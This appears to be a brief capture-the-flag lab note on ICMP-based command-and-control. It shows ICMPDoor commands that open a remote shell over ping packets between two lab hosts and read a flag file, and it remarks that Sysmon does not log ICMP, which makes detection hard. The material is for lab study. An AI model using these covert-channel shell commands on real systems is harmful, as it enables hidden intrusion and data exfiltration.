# ICMP C2 communication

Data exfiltration can also leverage ICMP flows with a C2 server, using the data payload in ICMP-PING packets.

The detection of data exfiltration using this method is not easy since it’s hard to tell apart "normal", legit 
ICMP traffic from ICMP flows part of an exfiltration attempt. Furthermore, some tools used for endpoint telemetry, 
such as Sysmon, record TCP/UDP connections but not ICMP flows.

Using the [ICMPDoor](https://github.com/krabelize/icmpdoor) tool.

On icmp host:

    thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133

On jump host:

    thm@jump-box:~$ sudo icmp-cnc -i eth1 -d 192.168.0.121
    [sudo] password for thm:
    shell: hostname
    hostname
    shell: icmp-host

Get the flag:

    shell: getFlag
    getFlag
    shell: [+] Check the flag: /tmp/flag.txt
    
    shell: cat /tmp/flag.txt
    cat /tmp/flag.txt

## Resources

* [icyguider/ICMP-TransferTools](https://github.com/icyguider/ICMP-TransferTools)